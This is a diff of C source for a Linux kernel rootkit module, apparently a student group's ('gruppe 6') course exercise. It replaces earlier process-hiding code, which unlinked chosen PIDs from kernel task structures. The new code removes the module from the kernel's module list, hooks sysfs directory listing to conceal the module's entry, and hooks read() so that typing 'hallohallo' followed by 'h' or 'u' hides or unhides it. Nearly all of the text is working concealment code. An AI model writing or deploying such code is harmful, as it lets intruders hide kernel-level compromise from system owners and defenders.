@@ -1,122 +1,169 @@
 #include <linux/module.h>    /* Needed by all modules */
 #include <linux/kernel.h>    /* Needed for KERN_INFO */
-#include <linux/sched.h>
-#include <linux/list.h>
+#include <linux/fs.h>
+//#include <linux/sched.h>
+//#include <linux/list.h>
+
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
+#include "hook_read.h"
 
+
+/// sysfs stuff
+typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
+fun_int_file_dirent_filldir_t original_sysfs_readdir;
+filldir_t original_sysfs_filldir;
+
+
+char activate_pattern[] = "hallohallo";
+int size_of_pattern = sizeof(activate_pattern)-1;
+int cur_position = 0;
+int last_match = -1;
+
+int hidden = 0;
+
+struct list_head tos;
 
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
-// for hooking the original read function
-typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
 
-fun_ssize_t_int_pvoid_size_t     original_read;
 
-struct hlist_head* pid_hash_table;
-
-static int pids_to_hide[200];
-static int pids_count = 0;
-module_param_array(pids_to_hide, int, &pids_count, 0000);
-MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");
-
-typedef struct task_struct* (*fun_task_struct_pid_t) (pid_t);
-
-void hide_processes_hash(pid_t pth){
-    struct task_struct* task;
-    pid_hash_table = (struct hlist_head*) ptr_pid_hash;
-    task = ((fun_task_struct_pid_t)ptr_find_task_by_vpid)(pth);
-    if (task){
-        struct pid_link tmp = task->pids[0];
-        hlist_del_rcu(&(tmp.node));
-    }
-}
-
-void hide_processes_traverse_tree(struct task_struct* root_task){
-    struct task_struct* task;
-    struct task_struct* next;
-    struct list_head* next_ptr;
-    struct list_head* prev_ptr;
-
-    // an empty subtree, so just skip it
-    if (root_task->children.next == &root_task->children){
+/*
+ * Hiding a module is basically just removing it from the list of modules
+ */
+void hide_me(void)
+{
+    struct list_head *prev;
+    struct list_head *next;
+    if(hidden == 1)
         return;
-    }
+    prev = THIS_MODULE->list.prev;
+    next = THIS_MODULE->list.next;
+    prev->next = next;
+    next->prev = prev;
+    hidden = 1;
+}
 
-    task = list_entry(root_task->children.next, struct task_struct, sibling);
-    while (1) {
-        if (task->sibling.next == &root_task->children){
-            break;
+
+void unhide_me(void)
+{
+    struct list_head *mods;
+    struct list_head *this_list_head;
+    if(hidden == 0)
+        return;
+
+    mods = (struct list_head *) ptr_modules;
+    this_list_head = &THIS_MODULE->list;
+
+
+    //insert this module into the list of modules (to the front)
+    mods->next->prev = this_list_head; // let prev of the (former) first module point to us
+    this_list_head->next = mods->next; // let our next pointer point to the former first module
+
+    mods->next = this_list_head; // let the modules list next pointer point to us
+    this_list_head->prev = mods; // let out prev pointer point to the modules list
+
+    hidden = 0;
+}
+
+static void handleChar(char c){
+    if(c=='\n' || c == '\r'){ //cancel command with newline
+//        OUR_DEBUG("newline");
+        last_match = -1;
+        cur_position = 0;
+    } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
+        if(c == 'h'){ //hide
+            OUR_DEBUG("HIDE THIS MODULE");
+            hide_me();
+            last_match = -1;
+            cur_position = 0;
+        } else if(c == 'u') { //unhide
+            OUR_DEBUG("UNHIDE THIS MODULE");
+            unhide_me();
+            last_match = -1;
+            cur_position = 0;
+        } else {
+            //ignore everything else and wait for a valid command
         }
-        prev_ptr = task->sibling.prev;
-        next_ptr = task->sibling.next;
-        if (task->pid == 4){
-            OUR_DEBUG("Removing task 4 from the tree\n");
-            prev_ptr->next = next_ptr;
-            next_ptr->prev = prev_ptr;
+    } else if(last_match+1 == cur_position){ // activate_pattern matched until last_match, now we compare with last_match + 1
+        if(c == activate_pattern[cur_position]) { // match further
+//            OUR_DEBUG("match %c", c);
+            last_match++;
+            cur_position++;
+        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
+//            OUR_DEBUG("backspace but right");
+            if(cur_position != 0){
+                last_match--;
+                cur_position--;
+            }
+        } else { // wrong char
+//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
+            cur_position++;
         }
-        hide_processes_traverse_tree(task);
-        // now the next task
-        next = list_entry(task->sibling.next, struct task_struct, sibling);
-        task = next;
+    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
+        if(c == 127 || c == '\b'){
+//            OUR_DEBUG("backspace wrong");
+            if(cur_position != 0){
+                cur_position--;
+            }
+        } else {
+//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
+            cur_position++;
+        }
     }
 }
 
-void hide_processes(void){
-int i;
-    struct task_struct* task;
-    struct task_struct* prev;
-    struct task_struct* next;
-    task = &init_task;
-    prev = NULL;
-    OUR_DEBUG("Simple task list:\n");
-    do {
-        // the previous task (prev) is obtained by a expanded macro
-        // found in the linux kernel. it is basically the
-        // adapted expansion of "next_task"
-        prev = list_entry(task->tasks.prev, struct task_struct, tasks);
-        next = next_task(task);
-        OUR_DEBUG("%s [%d], (%d, %d)\n", task->comm, task->pid, prev->pid, next->pid);
-        if (task->pid > 0){ // somethin has 0, which shall not be taken into consideration
-            hide_processes_traverse_tree(task);
-        }
-        // the following routine seems to correctly
-        // remove elements from the tasks list
-        for (i=0; i<pids_count; ++i){
-            if (task->pid == pids_to_hide[i]){
-                prev->tasks.next = task->tasks.next;
-                next->tasks.prev = task->tasks.prev;
-            }
-        }
-    } while ((task = next) != &init_task);
-    for (i=0; i<pids_count; ++i){
-        hide_processes_hash(pids_to_hide[i]);
+static void handle_input(char *buf, int count)
+{
+    int i;
+    for(i = 0; i<count; i++){
+        handleChar(buf[i]);
     }
+}
+
+
+int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
+    if (hidden && strcmp(name, THIS_MODULE->name) == 0){
+        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
+        return 0;
+    }
+    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
+int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
+    OUR_DEBUG("Hooked sysfs_readdir.\n");
+    original_sysfs_filldir = filldir;
+    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
+}
+
+
+void hook_sysfs(void){
+    struct file_operations* sysfs_dir_ops;
+    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
+    original_sysfs_readdir = sysfs_dir_ops->readdir;
+    make_page_writable((long unsigned int) sysfs_dir_ops);
+    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
+    make_page_readonly((long unsigned int) sysfs_dir_ops);
+}
+
+
+void unhook_sysfs(void){
+    struct file_operations* sysfs_dir_ops;
+    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
+    make_page_writable((long unsigned int) sysfs_dir_ops);
+    sysfs_dir_ops->readdir = original_sysfs_readdir;
+    make_page_readonly((long unsigned int) sysfs_dir_ops);
 }
 
 
 /* Initialization routine */
 static int __init _init_module(void)
 {
-    int i;
-    struct task_struct *task;
-
-    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
-
-    printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
-    for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
-        printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
-    }
-
-    hide_processes();
-
-    for_each_process(task)
-    {
-        printk("%s [%d]\n",task->comm , task->pid);
-    }
-
+    printk(KERN_INFO "This is the kernel module of gruppe 6. %d\n", size_of_pattern);
+    hook_read(handle_input);
+    hook_sysfs();
 
     return 0;
 }
@@ -124,6 +171,8 @@ static int __init _init_module(void)
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
+    unhook_sysfs();
+    unhook_read();
     printk(KERN_INFO "Gruppe 6 says goodbye.\n");
 }
 
